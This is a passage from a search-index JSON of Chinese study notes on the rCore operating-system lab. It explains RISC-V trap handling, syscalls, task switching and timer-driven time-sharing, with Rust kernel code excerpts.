<li>\u5f53\u5e94\u7528\u7a0b\u5e8f\u6267\u884c\u51fa\u9519\u7684\u65f6\u5019\uff0c\u9700\u8981\u5230\u6279\u5904\u7406\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u6740\u6b7b\u8be5\u5e94\u7528\u5e76\u52a0\u8f7d\u8fd0\u884c\u4e0b\u4e00\u4e2a\u5e94\u7528\uff1b</li> <li>\u5f53\u5e94\u7528\u7a0b\u5e8f\u6267\u884c\u7ed3\u675f\u7684\u65f6\u5019\uff0c\u9700\u8981\u5230\u6279\u5904\u7406\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u52a0\u8f7d\u8fd0\u884c\u4e0b\u4e00\u4e2a\u5e94\u7528\uff08\u5b9e\u9645\u4e0a\u4e5f\u662f\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528 <code>sys_exit</code>\u200b \u6765\u5b9e\u73b0\u7684\uff09\u3002</li> </ul> <p>\u672c\u8eab\u7684\u7279\u6743\u7ea7\u7684\u5207\u6362\u662f\u6bd4\u8f83\u590d\u6742\u7684\uff0c\u6211\u4eec\u8fd9\u6b21\u53ea\u770b\u7528\u6237\u6001\u548c\u5185\u6838\u6001\u7684\u5207\u6362\u3002\u63a5\u4e0b\u6765\u770b\u770b\u4ee3\u7801\u662f\u5982\u4f55\u4e00\u4e00\u5b9e\u73b0\u4e0a\u8ff0\u7684\u529f\u80fd</p> <p>riscv\u4e3aTrap\u51c6\u5907\u4e86\u4e00\u7cfb\u5217\u7684\u5bc4\u5b58\u5668\u6765\u8f85\u52a9Trap\u7684\u5b9e\u73b0</p> <p>\u200b\u200b</p> <p>\u540c\u65f6\u5728\u7279\u6743\u7ea7\u5207\u6362\u7684\u65f6\u5019\uff0c\u548c\u51fd\u6570\u8c03\u7528\u4e00\u6837\uff0c\u9700\u8981\u627e\u4e00\u4e2a\u5730\u65b9\u4fdd\u5b58\u524d\u4e00\u4e2a\u7279\u6743\u7ea7\u72b6\u6001\u7684\u5bc4\u5b58\u5668\u548c\u6808\u7a7a\u95f4\uff0c\u4e3a\u4e86\u5b89\u5168\u6027\u7684\u8003\u91cf\uff0c\u6211\u4eec\u533a\u5206\u4e86\u7528\u6237\u6808\u548c\u5185\u6838\u6808\uff0c\u4f7f\u5f97\u76f8\u5e94\u4e0a\u4e0b\u6587\u7684\u4fdd\u5b58\u4e0d\u81f3\u4e8e\u88ab\u8986\u76d6\uff0c\u6362\u6808\u7684\u65f6\u5019\u9700\u8981\u628asp\u5bc4\u5b58\u5668\u7684\u503c\u8bbe\u7f6e\u4e3a\u5bf9\u5e94\u7684\u6808\u9876</p> <p>\u5728Trap\u7684\u65f6\u5019\uff0c\u7cfb\u7edf\u4f1a\u5c06<code>sstatus</code>\u200b\u8f6c\u6362\u6210s\uff0c\u5e76\u4e14\u8df3\u8f6c\u5230Trap\u8c03\u7528\u8bbe\u5b9a\u7684<code>stvec</code>\u200b\u5904\uff0c\u4e0b\u9762\u662fTrapContext\u7684\u5b9e\u73b0\uff0c\u5305\u542b\u4e8632\u4e2a\u901a\u7528\u5bc4\u5b58\u5668\u548c\u4e24\u4e2aCSR</p> <p>\u5728\u672c\u7ae0\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u4f7f\u7528\u4e86\u4e09\u4e2a\u9636\u6bb5\u5b8c\u6210Trap</p> <ul> <li>\u4fdd\u5b58\u4e0a\u4e0b\u6587</li> <li>\u8c03\u7528<code>trap_handler</code>\u200b\u5b8c\u6210trap\u5de5\u4f5c</li> <li>\u8bfb\u53d6\u5e76\u6062\u590d\u4e0a\u4e0b\u6587</li> </ul> <pre><code>#[repr(C)]\npub struct TrapContext {\n    /// general regs[0..31]\n    pub x: [usize; 32],\n    /// CSR sstatus    \n    pub sstatus: Sstatus,\n    /// CSR sepc\n    pub sepc: usize,\n}\n</code></pre> <p>\u5728\u64cd\u4f5c\u7cfb\u7edf\u521d\u59cb\u5316\u7684\u65f6\u5019\uff0c\u8c03\u7528\u4e86<code>trap::init()</code>\u200b\u6765\u521d\u59cb\u5316\u4e86trap\u529f\u80fd</p> <pre><code>//trap::init()\npub fn init() {\n    extern \"C\" {\n        fn __alltraps();\n    }\n    unsafe {\n        stvec::write(__alltraps as usize, TrapMode::Direct);\n    }\n}\n</code></pre> <p>\u8fd9\u4e2a\u529f\u80fd\u662f\u6211\u4eec\u5c06<code>__alltraps</code>\u200b\u8fd9\u4e2a\u6c47\u7f16\u51fd\u6570\u7684\u5730\u5740\u5199\u5230\u4e86stevec\u4e0a\uff0c\u8fd9\u4e2a\u6c47\u7f16\u51fd\u6570\u5b9e\u73b0\u4e86\u7b2c\u4e00\u6b65\u4fdd\u5b58\u4e0a\u4e0b\u6587\u7684\u5de5\u4f5c\uff0c\u8fd9\u4e2a\u6c47\u7f16\u51fd\u6570\u7684\u6700\u540e\u4e00\u6b65\u5c31\u662f\u8c03\u7528<code>trap_handler</code>\u200b\u51fd\u6570</p> <pre><code>    # set input argument of trap_handler(cx: &amp;mut TrapContext)\n    mv a0, sp\n    call trap_handler\n</code></pre> <p>\u73b0\u5728\u6211\u4eec\u6765\u770b<code>trap_handler</code>\u200b\uff0c\u629b\u5f00\u9519\u8bef\u60c5\u5f62\u4e0d\u8c08\uff0c\u4e00\u822c\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u51fd\u6570\u7684\u4e3b\u9898\u90e8\u5206\u5e94\u8be5\u5728\u7b2c9\u884c\u8c03\u7528<code>syscall</code>\u200b\uff0c\u5728\u8c03\u7528<code>syscall</code>\u200b\u4e4b\u524d\uff0c\u6211\u4eec\u901a\u8fc7riscv\u5e93\uff0c\u83b7\u53d6\u4e86\u4e24\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u5e76\u4e14\u6839\u636escause\u7684\u72b6\u6001\u6765\u5206\u53d1trap\u7684\u5206\u652f</p> <pre><code>#[no_mangle]\n/// handle an interrupt, exception, or system call from user space\npub fn trap_handler(cx: &amp;mut TrapContext) -&gt; &amp;mut TrapContext {\n    let scause = scause::read(); // get trap cause\n    let stval = stval::read(); // get extra value\n    match scause.cause() {\n        Trap::Exception(Exception::UserEnvCall) =&gt; {\n            cx.sepc += 4;\n            cx.x[10] = syscall(cx.x[17], [cx.x[10], cx.x[11], cx.x[12]]) as usize;\n        }\n        Trap::Exception(Exception::StoreFault) | Trap::Exception(Exception::StorePageFault) =&gt; {\n            println!(\"[kernel] PageFault in application, kernel killed it.\");\n            run_next_app();\n        }\n        Trap::Exception(Exception::IllegalInstruction) =&gt; {\n            println!(\"[kernel] IllegalInstruction in application, kernel killed it.\");\n            run_next_app();\n        }\n        _ =&gt; {\n            panic!(\n                \"Unsupported trap {:?}, stval = {:#x}!\",\n                scause.cause(),\n                stval\n            );\n        }\n    }\n    cx\n}\n</code></pre> <p>\u7136\u540e\u6211\u4eec\u6765\u770b<code>syscall</code>\u200b\uff0c\u5176\u5b9e\u5c31\u662f\u4e0a\u4e00\u7ae0\u6211\u4eec\u5b9e\u73b0\u7684\u90a3\u4e24\u4e2a\u529f\u80fd</p> <pre><code>pub fn syscall(syscall_id: usize, args: [usize; 3]) -&gt; isize {\n    match syscall_id {\n        SYSCALL_WRITE =&gt; sys_write(args[0], args[1] as *const u8, args[2]),\n        SYSCALL_EXIT =&gt; sys_exit(args[0] as i32),\n        _ =&gt; panic!(\"Unsupported syscall_id: {}\", syscall_id),\n    }\n}\n</code></pre> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/rcore/rCore%20%E6%B8%85%E5%8D%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/#3","title":"3. \u591a\u9053\u7a0b\u5e8f\u548c\u5206\u65f6\u591a\u4efb\u52a1","text":"<p>\u6240\u8c13\u7684\u591a\u9053\u7a0b\u5e8f\u5c31\u662f\u540c\u65f6\u5728\u5185\u5b58\u4e2d\u52a0\u8f7d\u591a\u4e2a\u7a0b\u5e8f\uff0c\u4f46\u662f\u7a0b\u5e8f\u7684\u6267\u884c\u987a\u5e8f\u4f9d\u65e7\u662f\u987a\u5e8f\u7684\uff0c\u4f46\u662f\u968f\u7740\u6027\u80fd\u7684\u53d1\u5c55\uff0c\u4eba\u4eec\u53d1\u73b0IO\u5bf9\u4e8e\u8fd0\u884c\u6027\u80fd\u7684\u5f71\u54cd\u8d8a\u6765\u8d8a\u5927\uff0c\u5f88\u591a\u65f6\u5019\u9700\u8981\u7cfb\u7edf\u8fdb\u884c\u4e00\u4e9b\u8bbe\u8ba1\uff0c\u964d\u4f4eIO\u5bf9\u4e8e\u7a0b\u5e8f\u8fd0\u884c\u7684\u5f71\u54cd\u3002\u4ece\u7a0b\u5e8f\u4e2d\u62bd\u8c61\u51fa\u4efb\u52a1\u548c\u4efb\u52a1\u5207\u7247\u7b49\u6982\u5ff5\uff0c\u9700\u8981\u5bf9\u6bcf\u4e2a\u7a0b\u5e8f\u4fdd\u5b58\u5176\u5404\u81ea\u7684\u7528\u6237\u6808\uff0c\u5728\u4e0a\u4e00\u7ae0\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u6574\u4e2a\u7528\u6237\u6001\u5bf9\u5e94\u4e00\u4e2a\u7528\u6237\u6808</p> <p>\u540e\u7eed\u4eba\u4eec\u53d1\u73b0\u8ba9\u7528\u6237\u7a0b\u5e8f\u4e3b\u52a8\u53bb\u8fdb\u884c\u653e\u5f03\u4efb\u52a1\u63d0\u9ad8\u534f\u4f5c\u6548\u7387\u4e0d\u592a\u73b0\u5b9e\uff0c\u4e8e\u662f\u5c31\u5f15\u5165\u4e86\u65f6\u949f\u4e2d\u65ad\u673a\u5236\uff0c\u8ba9\u64cd\u4f5c\u7cfb\u7edf\u7a0b\u5e8f\u6765\u7ba1\u7406\u7528\u6237\u7a0b\u5e8f\u7684\u4e2d\u65ad\u3002</p> <ul> <li>ch3-coop \u5206\u652f\u4e0a\u7684\u7cfb\u7edf\u4e3b\u8981\u662f\u533a\u5206\u4e86\u5404\u4e2a\u7a0b\u5e8f\u81ea\u5df1\u7684\u7528\u6237\u6808\uff0c\u540c\u65f6\u652f\u6301\u7a0b\u5e8f\u4e3b\u52a8\u653e\u5f03CPU\u5360\u7528\u7684\u540c\u65f6\uff0c\u8fd8\u80fd\u4fdd\u5b58\u81ea\u8eab\u7684\u72b6\u6001</li> <li>ch3 \u5206\u652f\u4e0a\u7684\u7cfb\u7edf\u4e3b\u8981\u662f\u589e\u52a0\u4e86\u65f6\u949f\u4e2d\u65ad\u529f\u80fd\uff0c\u5b9e\u73b0\u5206\u65f6\u591a\u4efb\u52a1</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/rcore/rCore%20%E6%B8%85%E5%8D%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/#31","title":"3.1 \u591a\u9053\u7a0b\u5e8f","text":"<p>\u591a\u9053\u7a0b\u5e8f\u7684\u52a0\u8f7d</p> <p>\u5728<code>user/build.py</code>\u200b\u811a\u672c\u4e2d\uff0c\u6211\u4eec\u7528<code>cargo build</code>\u200b\u6307\u4ee4\u6784\u5efa\u4e86<code>bin/</code>\u200b\u4e0b\u6bcf\u4e2a\u6587\u4ef6\uff0c\u4e0e\u4e0a\u4e00\u7ae0\u64cd\u4f5c\u7cfb\u7edf\u4e0d\u540c\u7684\u662f\uff0c\u672c\u7ae0\u7684\u5e94\u7528\u7a0b\u5e8f\u4f1a\u5728\u4e00\u5f00\u59cb\u90fd\u52a0\u8f7d\u5230\u5185\u5b58\u91cc\u9762\uff0c\u8fd9\u4e00\u90e8\u5206\u5b9e\u73b0\u5728<code>os/src/loader.rs</code>\u200b \u4e2d</p> <p>\u8fd9\u6bb5\u4ee3\u7801\u7684\u6838\u5fc3\u542b\u4e49\u5c31\u662f\u540c\u65f6\u628a\u6240\u6709\u7684\u5e94\u7528\u7a0b\u5e8f\u52a0\u8f7d\u5230\u5185\u5b58\u91cc\uff0c\u4e0b\u9762\u8fd9\u6bb5\u4ee3\u7801\u662f\u6211\u4eec\u5bf9\u4e8e\u5176\u5185\u5b58\u4f4d\u7f6e\u7684\u5b89\u6392\uff0c\u5728\u6839\u636eConfig\u91cc\u9762\u5b89\u6392\u7684\u5e38\u6570\uff0c\u770b\u5230\u6211\u4eec\u5bf9\u4e8e\u6bcf\u4e2a\u5e94\u7528\u7a0b\u5e8f\u7684\u5185\u5b58\u955c\u50cf\u7684\u7a7a\u95f4\u4e0a\u9650\u662f<code>0x20000</code>\u200b</p> <pre><code> // os/src/loader.rs\n\n fn get_base_i(app_id: usize) -&gt; usize {\n     APP_BASE_ADDRESS + app_id * APP_SIZE_LIMIT\n }\n\n// os/src/config.rs\n\npub const USER_STACK_SIZE: usize = 4096 * 2;\npub const KERNEL_STACK_SIZE: usize = 4096 * 2;\npub const MAX_APP_NUM: usize = 4;\npub const APP_BASE_ADDRESS: usize = 0x80400000;\npub const APP_SIZE_LIMIT: usize = 0x20000;\n</code></pre> <p>\u591a\u9053\u7a0b\u5e8f\u7684\u4efb\u52a1\u5207\u6362</p> <p>\u5728\u4efb\u52a1\u5207\u6362\u4e2d\u6211\u4eec\u518d\u4e00\u6b21\u6d89\u53ca\u5230\u4e86\u63a7\u5236\u6d41\u7684\u53d8\u66f4\uff0c\u5c31\u5982\u540c\u6211\u4eec\u4e4b\u524d\u7684\u7cfb\u7edf\u8c03\u7528\u4e00\u6837\uff0c\u6211\u4eec\u5c06\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u8ba4\u4e3a\u662f\u4e00\u4e2a\u4efb\u52a1\uff0c\u8fd9\u4e2a\u4efb\u52a1\u53ef\u4ee5\u88ab\u5207\u6210\u4e00\u4e2a\u4e2a\u4efb\u52a1\u5207\u7247</p> <p>\u4efb\u52a1\u5207\u6362\u7684\u5173\u952e\u5728\u4e8e\u4e00\u4e2a<code>__switch</code>\u200b\u51fd\u6570\uff0c\u5176\u901a\u8fc7\u624b\u5199\u6c47\u7f16\u7684\u65b9\u5f0f\u4f4d\u4e8e\uff0c<code>os/src/task/switch.S</code>\u200b\uff0c\u8be5\u51fd\u6570\u7684\u7279\u6b8a\u6027\u5728\u4e8e\u5176\u5b9e\u73b0\u4e86\u6362\u6808\uff0c\u5176\u5177\u4f53\u6d41\u7a0b\u4e3a</p> <ul> <li>\u5b58\u50a8A\u7684CPU\u5bc4\u5b58\u5668\u5feb\u7167\u5728A\u7684\u4e0a\u4e0b\u6587\u4e2d</li> <li>\u8bfb\u53d6B\u7684\u4e0a\u4e0b\u6587\uff0c\u6062\u590d\u5176\u4e0a\u4e0b\u6587\u4e8e\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668</li> </ul> <p>\u56e0\u6b64\u5176\u9700\u8981\u4e24\u4e2a\u53c2\u6570\uff0c\u5b58\u50a8A\uff0cB\u4efb\u52a1\u7684\u4e0a\u4e0b\u6587\u5730\u5740\uff0c\u5177\u4f53\u9700\u8981\u4fdd\u5b58\u7684\u5185\u5bb9\u5982\u4e0b</p> <pre><code>// os/src/task/context.rs\n\npub struct TaskContext {\n    ra: usize,\n    sp: usize,\n    s: [usize; 12],\n}\n</code></pre> <p>\u5728\u6211\u4eec\u5b9e\u73b0\u4e86<code>__switch</code>\u200b \u51fd\u6570\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u4efb\u52a1\u8fd0\u884c\u7ed3\u675f\u548c\u4efb\u52a1\u4e3b\u52a8\u6682\u505c\u7684\u8fc7\u7a0b\u4e2d\u8c03\u7528\u5b83\uff0c\u4ee5\u5f62\u6210\u57fa\u7840\u7684\u591a\u9053\u7a0b\u5e8f\u64cd\u4f5c\u7cfb\u7edf</p> <p>\u5728\u672c\u7ae0\u4e2d\uff0c\u4efb\u52a1\u4e3b\u52a8\u6682\u505c\u53ea\u53d1\u751f\u5728IO\u5904\u7406\u4e2d\uff0c\u540e\u7eed\u8fd8\u53ef\u4ee5\u770b\u5230IO\u4ee5\u5916\u7684\u4efb\u52a1\u5207\u6362\u9700</p> <pre><code>#[derive(Copy, Clone)]\npub struct TaskControlBlock {\n    pub task_status: TaskStatus, //\u4efb\u52a1\u7684\u72b6\u6001\n    pub task_cx: TaskContext,    //\u4efb\u52a1\u7684\u4e0a\u4e0b\u6587\n}\n</code></pre> <p>\u501f\u6b64\uff0c\u53ef\u4ee5\u62d3\u5c55\u4e0a\u4e00\u7ae0\u4e2d\u7684\u4efb\u52a1\u7ba1\u7406\u5668</p> <pre><code>pub struct TaskManager {\n    num_app: usize,\n    inner: UPSafeCell&lt;TaskManagerInner&gt;,\n}\n\nstruct TaskManagerInner {\n    tasks: [TaskControlBlock; MAX_APP_NUM],\n    current_task: usize,\n}\n</code></pre> <p>\u7136\u540e\u7684\u91cd\u70b9\u5728\u4e8e\uff0c\u4e3b\u52a8\u5207\u6362\u64cd\u4f5c\u7684\u5b9e\u73b0\uff0c\u6211\u4eec\u5c06\u5176\u5c01\u88c5\u4e3a\u7cfb\u7edf\u8c03\u7528\uff0c\u5728os\u4e2d\u7684\u5177\u4f53\u5b9e\u73b0\u4e3a</p> <pre><code>/// current task gives up resources for other tasks\npub fn sys_yield() -&gt; isize {\n    suspend_current_and_run_next();\n    0\n}\n</code></pre> <p>\u6211\u4eec\u8fdb\u4e00\u6b65\u5411\u4e0b\u67e5\u627e\u5177\u4f53\u5b9e\u73b0</p> <pre><code>/// suspend current task, then run next task\npub fn suspend_current_and_run_next() {\n    mark_current_suspended();\n    run_next_task();\n}\n</code></pre> <ul> <li>\u4fee\u6539\u5f53\u524d\u5e94\u7528\u7684\u8fd0\u884c\u72b6\u6001</li> <li>\u627e\u5230\u4e0b\u4e00\u4e2a\u53ef\u4ee5\u5e94\u7528\u7684\u4e1c\u897f</li> <li>\u8fd0\u884c\u4e0b\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f</li> </ul> <pre><code>fn run_next_task() {\n    TASK_MANAGER.run_next_task();\n}\n\nimpl TaskManager {\n    fn run_next_task(&amp;self) {\n        if let Some(next) = self.find_next_task() {\n            let mut inner = self.inner.exclusive_access();\n            let current = inner.current_task;\n            inner.tasks[next].task_status = TaskStatus::Running;\n            inner.current_task = next;\n            let current_task_cx_ptr = &amp;mut inner.tasks[current].task_cx as *mut TaskContext;\n            let next_task_cx_ptr = &amp;inner.tasks[next].task_cx as *const TaskContext;\n            drop(inner);\n            // before this, we should drop local variables that must be dropped manually\n            unsafe {\n                __switch(\n                    current_task_cx_ptr,\n                    next_task_cx_ptr,\n                );\n            }\n            // go back to user mode\n        } else {\n            panic!(\"All applications completed!\");\n        }\n    }\n}\n</code></pre> <p>\u5728\u8fd9\u91cc\u6211\u4eec\u6269\u5c55\u4e86\u4e0a\u4e00\u5c4a\u7684TaskManager\uff0c\u53d8\u6210\u5982\u4e0b\u7ed3\u6784</p> <pre><code>pub struct TaskManager {\n    /// total number of tasks\n    num_app: usize,\n    /// use inner value to get mutable access\n    inner: UPSafeCell&lt;TaskManagerInner&gt;,\n}\n\n/// Inner of Task Manager\npub struct TaskManagerInner {\n    /// task list\n    tasks: [TaskControlBlock; MAX_APP_NUM],\n    /// id of current `Running` task\n    current_task: usize,\n}\n\n#[derive(Copy, Clone)]\npub struct TaskControlBlock {\n    pub task_status: TaskStatus,\n    pub task_cx: TaskContext,\n}\n\n#[derive(Copy, Clone, PartialEq)]\npub enum TaskStatus {\n    UnInit,\n    Ready,\n    Running,\n    Exited,\n}\n</code></pre> <p>\u5c06task\u62bd\u8c61\u4e3a\u4e00\u4e2a<code>TaskControlBlock</code>\u200b\u6570\u7ec4\uff0c\u5728\u8be5Block\u4e2d\u7ef4\u62a4\u4e86\u6bcf\u4e2a\u4efb\u52a1\u7684\u5f53\u524d\u72b6\u6001\u4ee5\u53ca\u5176\u4e0a\u4e0b\u6587\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u770b\u5982\u4f55\u521b\u5efa\u8fd9\u6837\u4e00\u4e2a\u5168\u5c40\u7684\u63a7\u5236\u5668</p> <pre><code>lazy_static! {\n    /// Global variable: TASK_MANAGER\n    pub static ref TASK_MANAGER: TaskManager = {\n        let num_app = get_num_app();            //\u6784\u5efa\u7684\u65f6\u5019\u5199\u6b7b\u5728\u5185\u5b58\u91cc\n        let mut tasks = [TaskControlBlock {\n            task_cx: TaskContext::zero_init(),  //\u4e0a\u4e0b\u6587\u5bc4\u5b58\u5668\u59d1\u4e14\u8bbe\u7f6e\u4e3a0\n            task_status: TaskStatus::UnInit,    //\u72b6\u6001\u8bbe\u7f6e\u4e3a\u672a\u521d\u59cb\u5316\n        }; MAX_APP_NUM];\n        for (i, task) in tasks.iter_mut().enumerate() {\n            task.task_cx = TaskContext::goto_restore(init_app_cx(i)); //\u52a0\u8f7d\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u5185\u5bb9\n            task.task_status = TaskStatus::Ready;                     //\u72b6\u6001\u8bbe\u7f6e\u4e3aReady\n        }\n        //\u521b\u5efa\u8fd9\u4e2aTaskManager\n        TaskManager {\n            num_app,\n            inner: unsafe {\n                UPSafeCell::new(TaskManagerInner {\n                    tasks,\n                    current_task: 0,\n                })\n            },\n        }\n    };\n}\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/rcore/rCore%20%E6%B8%85%E5%8D%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/#32","title":"3.2 \u5206\u65f6\u591a\u4efb\u52a1","text":"<p>\u4e0a\u4e00\u5c0f\u8282\u5b9e\u73b0\u7684\u591a\u9053\u7a0b\u5e8f\u64cd\u4f5c\u7cfb\u7edf\u867d\u7136\u53ef\u4ee5\u6709\u6548\u964d\u4f4eIO\u8bbe\u5907\u5bf9\u4e8eCPU\u7a7a\u8017\u7684\u5f71\u54cd\uff0c\u4f46\u662f\u95ee\u9898\u5728\u4e8e\u6839\u636eIO\u8bbe\u5907\u5207\u6362\u5230\u7684\u4e0b\u4e00\u6761\u7a0b\u5e8f\u7684\u8fd0\u884c\u65f6\u95f4\u672a\u77e5\uff0c\u5f88\u6709\u53ef\u80fd\u4f1a\u5bfc\u81f4\u6bcf\u4e00\u6b21IO\u7684\u54cd\u5e94\u533a\u522b\u5f88\u5927\uff0c\u8fd9\u5bf9\u4e8e\u9ad8\u4ea4\u4e92\u6027\u7684\u7a0b\u5e8f\u6765\u8bf4\u662f\u4e0d\u53ef\u63a5\u53d7\u7684\uff0c\u4e8e\u662f\u5c31\u6709\u4e86\u672c\u7ae0\u7684\u5206\u65f6\u591a\u4efb\u52a1\u7684\u7cfb\u7edf</p> <p>\u76f8\u6bd4\u4e0e\u4e0d\u4e3b\u52a8<code>yield</code>\u200b\u5c31\u4e0d\u4f1a\u505c\u6b62\u8fd0\u884c\u7684\u591a\u9053\u7a0b\u5e8f\u7cfb\u7edf\uff0c\u5206\u65f6\u591a\u4efb\u52a1\u7cfb\u7edf\u4e2d\u7684\u7a0b\u5e8f\u968f\u65f6\u4f1a\u88ab\u64cd\u4f5c\u7cfb\u7edf\u5207\u51faCPU\uff0c\u6bcf\u4e2a\u7a0b\u5e8f\u6700\u591a\u53ea\u80fd\u8fd0\u884c\u56fa\u5b9a\u957f\u5ea6\u7684\u65f6\u95f4\uff0c\u968f\u540e\u5c31\u4f1a\u88ab\u5207\u51faCPU</p> <p>\u672c\u7ae0\u4f7f\u7528\u57fa\u7840\u7684\u65f6\u95f4\u7247\u8f6e\u8f6c\u7b97\u6cd5\u6765\u5904\u7406\u4efb\u52a1\u7247\u7684\u5904\u7406\u95ee\u9898</p> <p>\u90a3\u4e48\u8981\u8ba9\u64cd\u4f5c\u7cfb\u7edf\u5b9a\u65f6\u5207\u6362\u4efb\u52a1\uff0c\u9996\u5148\u5f97\u8ba9\u64cd\u4f5c\u7cfb\u7edf\u6709\u611f\u77e5\u65f6\u95f4\u7684\u80fd\u529b\uff0c\u8fd9\u90e8\u5206\u80fd\u529b\u5728Riscv\u4e2d\uff0c\u4e3b\u8981\u901a\u8fc7\u4e24\u4e2a\u5bc4\u5b58\u5668\u5b9e\u73b0\uff0c\u4e00\u4e2a\u5bc4\u5b58\u5668<code>mtime</code>\u200b\uff0c\u4fdd\u5b58\u7740\u6309\u7167\u5185\u7f6e\u65f6\u949f\u9891\u7387\u81ea\u589e\u7684\u65f6\u95f4\uff0c\u53e6\u4e00\u4e2a\u5bc4\u5b58\u5668<code>mtimecmp</code>\u200b\uff0c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6e\u8fd9\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u5f53<code>mtime</code>\u200b\u548c              <code>mtimecmp</code>\u200b\u4e24\u8fb9\u7684\u503c\u76f8\u540c\u5c31\u4f1a\u89e6\u53d1\u4e00\u6b21\u65f6\u949f\u4e2d\u65ad\uff0c\u8fd9\u4e5f\u662f\u6211\u4eec\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u9700\u8981\u63a7\u5236\u7684\u90e8\u5206\u3002\u5728<code>timer.rs</code>\u200b\u4e2d\u5c01\u88c5\u597d\u4e86\u57fa\u7840\u7684\u63a5\u53e3</p> <pre><code>use crate::config::CLOCK_FREQ;\nuse crate::sbi::set_timer;\nuse riscv::register::time;\n\nconst TICKS_PER_SEC: usize = 100;\nconst MSEC_PER_SEC: usize = 1000;\n\npub fn get_time() -&gt; usize {\n    time::read()\n}\n\n/// get current time in milliseconds\npub fn get_time_ms() -&gt; usize {\n    time::read() / (CLOCK_FREQ / MSEC_PER_SEC)\n}\n\n/// set the next timer interrupt\npub fn set_next_trigger() {\n    set_timer(get_time() + CLOCK_FREQ / TICKS_PER_SEC);\n}\n</code></pre> <p>\u65f6\u949f\u4e2d\u65ad\u662f\u6211\u4eec<code>trap</code>\u200b\u673a\u5236\u7684\u4e00\u90e8\u5206\uff0c\u56e0\u6b64\u5176\u8c03\u7528\u5b9e\u73b0\u5728\u4e8e\u4e4b\u524d\u7684\u7cfb\u7edf\u8c03\u7528\u7684\u90e8\u5206\u7684\u51fd\u6570\u4e2d</p> <pre><code>#[no_mangle]\n/// handle an interrupt, exception, or system call from user space\npub fn trap_handler(cx: &amp;mut TrapContext) -&gt; &amp;mut TrapContext {\n    let scause = scause::read(); // get trap cause\n    let stval = stval::read(); // get extra value\n    match scause.cause() {\n        Trap::Exception(Exception::UserEnvCall) =&gt; {\n            cx.sepc += 4;\n            cx.x[10] = syscall(cx.x[17], [cx.x[10], cx.x[11], cx.x[12]]) as usize;\n        }\n        ...\n        Trap::Interrupt(Interrupt::SupervisorTimer) =&gt; { //\u6d89\u53ca\u65f6\u949f\u4e2d\u65ad\u7684\u60c5\u5f62\n            set_next_trigger();\n            suspend_current_and_run_next();\n        }\n        ...\n    }\n    cx\n}\n</code></pre> <p>\u8bbe\u7f6e\u597d\u8fd9\u90e8\u5206\u4e4b\u540e\uff0c\u968f\u540e\u5728\u6bcf\u4e00\u6b21\u65f6\u949f\u4e2d\u65ad\u89e6\u53d1\u4e4b\u65f6\uff0c\u6211\u4eec\u5c31\u4f1a\u8bbe\u7f6e\u597d\u4e0b\u4e00\u6b21\u65f6\u949f\u4e2d\u65ad\u7684\u65f6\u95f4\uff0c\u5e76\u4e14\u8fd0\u884c\u4e0b\u4e00\u4e2a\u7a0b\u5e8f</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/rcore/rCore%20%E6%B8%85%E5%8D%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/#4","title":"4. \u5730\u5740\u7a7a\u95f4","text":"<p>\u6211\u4eec\u4e4b\u524d\u662f\u5c06\u6240\u6709\u5e94\u7528\u7a0b\u5e8f\u8bfb\u5165\u5230\u56fa\u5b9a\u7684\u4e00\u5757\u7269\u7406\u5185\u5b58\u4e2d\uff0c\u5e76\u4e14\u8bbe\u5b9a\u53e6\u4e00\u5757\u7269\u7406\u7a7a\u95f4\u7ed9\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\uff0c\u4e00\u5757\u7269\u7406\u7a7a\u95f4\u7ed9\u5185\u6838\u4f7f\u7528\u3002\u8fd9\u6837\u5b50\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u6765\u8bf4\u5b58\u5728\u6bd4\u8f83\u4e25\u91cd\u7684\u5b89\u5168\u95ee\u9898\uff0c\u5e76\u4e0d\u80fd\u6709\u6548\u505a\u5230\u5404\u4e2a\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u7684\u9694\u79bb\uff0cmemory\u7684\u4f7f\u7528\u6548\u7387\u4e5f\u4e0d\u9ad8</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u800c\u8a00\uff0c\u5206\u65f6\u7684\u4efb\u52a1\u8ba9\u5b83\u89c9\u5f97\u81ea\u5df1\u53ef\u4ee5\u72ec\u5360CPU\uff0c\u800c\u5730\u5740\u7a7a\u95f4\u53ef\u4ee5\u8ba9\u5176\u89c9\u5f97\u81ea\u5df1\u72ec\u5360\u4e00\u7247\u5185\u5b58\u7a7a\u95f4</p> 